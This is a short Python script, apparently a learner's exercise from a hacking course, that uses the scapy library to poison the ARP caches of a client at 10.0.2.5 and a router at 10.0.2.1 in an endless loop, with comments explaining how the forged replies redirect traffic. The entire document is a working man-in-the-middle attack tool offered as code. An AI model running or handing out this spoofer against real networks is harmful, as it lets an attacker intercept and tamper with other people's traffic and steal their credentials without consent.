#!/usr/bin/env python

import scapy.all as scapy
import time


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


sent_packet_count = 0
# this has set the variable as an integer not a string (which would be between quotes)


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    # op=2 means that this is arp response, we are spoofing a response! pdst is the packet destination, hwdst is the mac
    # destination. psrc is packet source and this what we are forging, this is the router IP address. We are tricking
    # the target machine into thinking our mac address is linked to the routers IP address
    # i.e. we've poisoned the arp cache
    # print(packet.show())
    # print(packet.summary())
    scapy.send(packet, verbose=False)
    # the false verbose option means you stop getting the message about packets being sent each time


while True:
    spoof("10.0.2.5", "10.0.2.1")
    # spoofs the client
    spoof("10.0.2.1", "10.0.2.5")
    # spoofs the router
    sent_packet_count = sent_packet_count + 2
    print("[+] Packets sent:" + str(sent_packet_count))
    time.sleep(2)

